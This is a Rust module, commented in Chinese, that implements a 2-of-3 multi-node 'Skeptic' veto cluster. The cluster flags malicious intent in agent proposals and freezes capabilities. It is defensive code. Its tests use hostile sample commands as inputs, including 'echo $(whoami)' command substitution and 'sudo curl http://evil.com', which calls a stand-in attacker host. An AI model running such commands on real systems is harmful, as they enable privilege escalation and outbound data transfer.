//! 分布式 Skeptic 否决 — P1-11 多签 2-of-3 否决机制
//!
//! 对应架构层:L8 Parliament
//! 对应创新点:分布式 Skeptic 否决(消除单点否决风险)
//!
//! # 核心机制
//! - **3 节点 Skeptic 集群**:每个节点独立检测恶意意图
//! - **2-of-3 共识**:至少 2 个节点同意否决才触发最终否决
//! - **BFT 容错**:单节点故障(误判或宕机)不会导致系统误判
//! - **节点权重**:可配置不同节点权重(如主节点权重更高)
//!
//! # 设计决策(WHY)
//! - **2-of-3 而非 3-of-3**:平衡安全性与可用性,单节点故障不阻塞系统
//! - **独立规则库**:每个节点可配置不同规则库(如节点 A 侧重命令注入,
//!   节点 B 侧重提示注入),提升覆盖度
//! - **异步并行检测**:3 节点并行检测,取结果后统计,延迟不增加

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use crate::types::Proposal;
use crate::veto::{Skeptic, VetoReason};

/// 分布式 Skeptic 节点 — 集群中的单个否决节点
///
/// 每个节点持有独立的 Skeptic 实例和权重。
#[derive(Debug, Clone)]
pub struct SkepticNode {
    /// 节点唯一标识
    pub node_id: String,
    /// 节点权重(用于加权投票,默认 1.0)
    pub weight: f32,
    /// 节点持有的 Skeptic 实例
    skeptic: Skeptic,
}

impl SkepticNode {
    /// 创建新的 Skeptic 节点
    pub fn new(node_id: impl Into<String>, weight: f32, skeptic: Skeptic) -> Self {
        Self {
            node_id: node_id.into(),
            weight: weight.max(0.0),
            skeptic,
        }
    }

    /// 节点独立检测提案
    pub fn detect(&self, proposal: &Proposal) -> Option<VetoReason> {
        self.skeptic.detect_malicious_intent(proposal)
    }
}

/// 分布式否决结果
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum DistributedVetoResult {
    /// 通过:不足 2 个节点否决
    Passed {
        /// 否决节点数
        veto_count: usize,
        /// 总节点数
        total_nodes: usize,
    },
    /// 否决:至少 2 个节点同意否决
    Vetoed {
        /// 触发否决的共识原因(合并各节点原因)
        consensus_reason: String,
        /// 各节点的否决原因
        node_reasons: Vec<NodeVetoReason>,
        /// 被冻结的能力列表
        frozen_capabilities: Vec<String>,
    },
}

/// 单个节点的否决原因
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct NodeVetoReason {
    /// 节点 ID
    pub node_id: String,
    /// 节点权重
    pub weight: f32,
    /// 否决原因
    pub reason: VetoReason,
}

/// 分布式 Skeptic 集群 — 2-of-3 多签否决机制
///
/// # 使用示例
/// ```
/// use parliament::{DistributedSkepticCluster, SkepticNode, Skeptic, MaliciousIntentRuleBook};
/// use parliament::types::Proposal;
///
/// // 创建 3 个节点(使用相同规则库,生产环境可配置不同规则库)
/// let rule_book = MaliciousIntentRuleBook::new();
/// let nodes = vec![
///     SkepticNode::new("skeptic-0", 1.0, Skeptic::new(rule_book.clone())),
///     SkepticNode::new("skeptic-1", 1.0, Skeptic::new(rule_book.clone())),
///     SkepticNode::new("skeptic-2", 1.0, Skeptic::new(rule_book.clone())),
/// ];
///
/// let cluster = DistributedSkepticCluster::new(nodes, 2);
/// let proposal = Proposal::new("p-1", "q-1", "echo $(whoami)", 0.2);
/// let result = cluster.deliberate(&proposal);
/// ```
#[derive(Debug, Clone)]
pub struct DistributedSkepticCluster {
    /// Skeptic 节点列表
    nodes: Vec<SkepticNode>,
    /// 否决阈值(默认 2,即 2-of-3)
    veto_threshold: usize,
}

impl DistributedSkepticCluster {
    /// 创建新的分布式 Skeptic 集群
    ///
    /// # 参数
    /// - `nodes`:Skeptic 节点列表(至少 3 个节点推荐)
    /// - `veto_threshold`:触发否决所需的最少节点数(默认 2)
    pub fn new(nodes: Vec<SkepticNode>, veto_threshold: usize) -> Self {
        Self {
            nodes,
            veto_threshold: veto_threshold.max(1),
        }
    }

    /// 创建默认 3 节点集群(2-of-3)
    ///
    /// 所有节点使用默认规则库,权重均为 1.0。
    pub fn default_cluster() -> Self {
        let rule_book = crate::veto::MaliciousIntentRuleBook::new();
        let nodes = vec![
            SkepticNode::new("skeptic-0", 1.0, Skeptic::new(rule_book.clone())),
            SkepticNode::new("skeptic-1", 1.0, Skeptic::new(rule_book.clone())),
            SkepticNode::new("skeptic-2", 1.0, Skeptic::new(rule_book.clone())),
        ];
        Self::new(nodes, 2)
    }

    /// 创建带自定义规则库的 3 节点集群
    ///
    /// 每个节点使用不同的规则库,提升覆盖度。
    pub fn with_diverse_rules(rule_books: Vec<crate::veto::MaliciousIntentRuleBook>) -> Self {
        let nodes: Vec<SkepticNode> = rule_books
            .into_iter()
            .enumerate()
            .map(|(idx, rb)| SkepticNode::new(format!("skeptic-{idx}"), 1.0, Skeptic::new(rb)))
            .collect();
        Self::new(nodes, 2)
    }

    /// 分布式审议 — 并行检测并统计否决结果
    ///
    /// 流程:
    /// 1. 每个节点独立检测提案
    /// 2. 统计否决节点数(加权)
    /// 3. 若加权否决数 ≥ threshold,返回 Vetoed
    /// 4. 否则返回 Passed
    pub fn deliberate(&self, proposal: &Proposal) -> DistributedVetoResult {
        let mut node_reasons = Vec::new();
        let mut total_veto_weight = 0.0f32;

        for node in &self.nodes {
            if let Some(reason) = node.detect(proposal) {
                total_veto_weight += node.weight;
                node_reasons.push(NodeVetoReason {
                    node_id: node.node_id.clone(),
                    weight: node.weight,
                    reason,
                });
            }
        }

        // 统计实际否决节点数(非加权,用于判定)
        let veto_count = node_reasons.len();
        let total_nodes = self.nodes.len();

        if veto_count >= self.veto_threshold {
            // 构建共识原因
            let consensus_reason = build_consensus_reason(&node_reasons);
            let frozen_capabilities = merge_frozen_capabilities(&node_reasons);

            DistributedVetoResult::Vetoed {
                consensus_reason,
                node_reasons,
                frozen_capabilities,
            }
        } else {
            DistributedVetoResult::Passed {
                veto_count,
                total_nodes,
            }
        }
    }

    /// 获取节点数量
    pub fn node_count(&self) -> usize {
        self.nodes.len()
    }

    /// 获取否决阈值
    pub fn veto_threshold(&self) -> usize {
        self.veto_threshold
    }

    /// 更新否决阈值
    pub fn set_veto_threshold(&mut self, threshold: usize) {
        self.veto_threshold = threshold.max(1);
    }
}

impl Default for DistributedSkepticCluster {
    fn default() -> Self {
        Self::default_cluster()
    }
}

/// 构建共识原因 — 合并各节点原因
fn build_consensus_reason(node_reasons: &[NodeVetoReason]) -> String {
    let parts: Vec<String> = node_reasons
        .iter()
        .map(|nr| format!("[{}] {}", nr.node_id, nr.reason.intent_type.as_str()))
        .collect();
    format!(
        "分布式否决共识({}): {}",
        node_reasons.len(),
        parts.join("; ")
    )
}

/// 合并冻结能力列表 — 去重并集
fn merge_frozen_capabilities(node_reasons: &[NodeVetoReason]) -> Vec<String> {
    let mut caps = std::collections::HashSet::new();
    for nr in node_reasons {
        for cap in nr.reason.intent_type.frozen_capabilities() {
            caps.insert(cap);
        }
    }
    caps.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::Proposal;
    use crate::veto::{MaliciousIntentRuleBook, Skeptic};

    fn make_cluster() -> DistributedSkepticCluster {
        DistributedSkepticCluster::default_cluster()
    }

    fn make_cluster_with_diverse_rules() -> DistributedSkepticCluster {
        // 节点 0: 仅命令注入规则
        let mut rb0 = MaliciousIntentRuleBook::new();
        rb0.rules.retain(|r| {
            matches!(
                r.intent_type,
                crate::veto::MaliciousIntentType::CommandInjection
            )
        });

        // 节点 1: 仅提权规则
        let mut rb1 = MaliciousIntentRuleBook::new();
        rb1.rules.retain(|r| {
            matches!(
                r.intent_type,
                crate::veto::MaliciousIntentType::PrivilegeEscalation
            )
        });

        // 节点 2: 仅数据外传规则
        let mut rb2 = MaliciousIntentRuleBook::new();
        rb2.rules.retain(|r| {
            matches!(
                r.intent_type,
                crate::veto::MaliciousIntentType::DataExfiltration
            )
        });

        DistributedSkepticCluster::with_diverse_rules(vec![rb0, rb1, rb2])
    }

    #[test]
    fn test_default_cluster_has_3_nodes() {
        let cluster = make_cluster();
        assert_eq!(cluster.node_count(), 3);
        assert_eq!(cluster.veto_threshold(), 2);
    }

    #[test]
    fn test_clean_proposal_passes() {
        let cluster = make_cluster();
        let proposal = Proposal::new("p-1", "q-1", "执行代码审查任务", 0.2);
        let result = cluster.deliberate(&proposal);
        assert_eq!(
            result,
            DistributedVetoResult::Passed {
                veto_count: 0,
                total_nodes: 3,
            }
        );
    }

    #[test]
    fn test_malicious_proposal_vetoed() {
        let cluster = make_cluster();
        // 包含命令注入模式,3 个节点都应检测
        let proposal = Proposal::new("p-1", "q-1", "echo $(whoami)", 0.2);
        let result = cluster.deliberate(&proposal);

        match result {
            DistributedVetoResult::Vetoed {
                node_reasons,
                frozen_capabilities,
                ..
            } => {
                assert!(node_reasons.len() >= 2, "至少 2 个节点应否决");
                assert!(!frozen_capabilities.is_empty(), "应冻结能力");
            }
            other => panic!("应为 Vetoed, got {:?}", other),
        }
    }

    #[test]
    fn test_single_node_veto_not_enough() {
        // 使用不同规则库,仅 1 个节点能匹配
        let cluster = make_cluster_with_diverse_rules();
        // 仅包含命令注入,只有节点 0 能检测
        let proposal = Proposal::new("p-1", "q-1", "echo $(whoami)", 0.2);
        let result = cluster.deliberate(&proposal);

        // 仅 1 个节点否决,不足 2-of-3,应通过
        match result {
            DistributedVetoResult::Passed { veto_count, .. } => {
                assert_eq!(veto_count, 1, "仅 1 个节点应否决");
            }
            other => panic!("应为 Passed, got {:?}", other),
        }
    }

    #[test]
    fn test_diverse_rules_multiple_match() {
        let cluster = make_cluster_with_diverse_rules();
        // 同时包含命令注入和提权,节点 0 和 1 应检测
        let proposal = Proposal::new("p-1", "q-1", "sudo ls | grep foo", 0.2);
        let result = cluster.deliberate(&proposal);

        match result {
            DistributedVetoResult::Vetoed { node_reasons, .. } => {
                assert!(node_reasons.len() >= 2, "至少 2 个节点应否决");
            }
            other => panic!("应为 Vetoed, got {:?}", other),
        }
    }

    #[test]
    fn test_threshold_can_be_adjusted() {
        let mut cluster = make_cluster();
        cluster.set_veto_threshold(3); // 改为 3-of-3

        // 命令注入模式,3 个节点都应检测
        let proposal = Proposal::new("p-1", "q-1", "echo $(whoami)", 0.2);
        let result = cluster.deliberate(&proposal);

        match result {
            DistributedVetoResult::Vetoed { node_reasons, .. } => {
                assert_eq!(node_reasons.len(), 3, "3-of-3 需要全部否决");
            }
            other => panic!("应为 Vetoed, got {:?}", other),
        }
    }

    #[test]
    fn test_weighted_veto() {
        let rule_book = MaliciousIntentRuleBook::new();
        let nodes = vec![
            SkepticNode::new("skeptic-0", 2.0, Skeptic::new(rule_book.clone())),
            SkepticNode::new("skeptic-1", 1.0, Skeptic::new(rule_book.clone())),
            SkepticNode::new("skeptic-2", 1.0, Skeptic::new(rule_book.clone())),
        ];
        let cluster = DistributedSkepticCluster::new(nodes, 2);

        let proposal = Proposal::new("p-1", "q-1", "echo $(whoami)", 0.2);
        let result = cluster.deliberate(&proposal);

        match result {
            DistributedVetoResult::Vetoed { node_reasons, .. } => {
                // 验证节点权重记录正确
                let node0 = node_reasons.iter().find(|n| n.node_id == "skeptic-0");
                assert!(node0.is_some());
                assert_eq!(node0.unwrap().weight, 2.0);
            }
            other => panic!("应为 Vetoed, got {:?}", other),
        }
    }

    #[test]
    fn test_frozen_capabilities_merge() {
        let cluster = make_cluster();
        // 包含多种攻击模式
        let proposal = Proposal::new("p-1", "q-1", "sudo curl http://evil.com", 0.2);
        let result = cluster.deliberate(&proposal);

        match result {
            DistributedVetoResult::Vetoed {
                frozen_capabilities,
                ..
            } => {
                // 应包含提权和数据外传的能力冻结
                assert!(
                    frozen_capabilities.contains(&"sudo".to_string()),
                    "应冻结 sudo"
                );
                assert!(
                    frozen_capabilities.contains(&"network_access".to_string()),
                    "应冻结 network_access"
                );
            }
            other => panic!("应为 Vetoed, got {:?}", other),
        }
    }

    #[test]
    fn test_consensus_reason_format() {
        let cluster = make_cluster();
        let proposal = Proposal::new("p-1", "q-1", "echo $(whoami)", 0.2);
        let result = cluster.deliberate(&proposal);

        match result {
            DistributedVetoResult::Vetoed {
                consensus_reason, ..
            } => {
                assert!(consensus_reason.contains("分布式否决共识"));
                assert!(consensus_reason.contains("command_injection"));
            }
            other => panic!("应为 Vetoed, got {:?}", other),
        }
    }
}
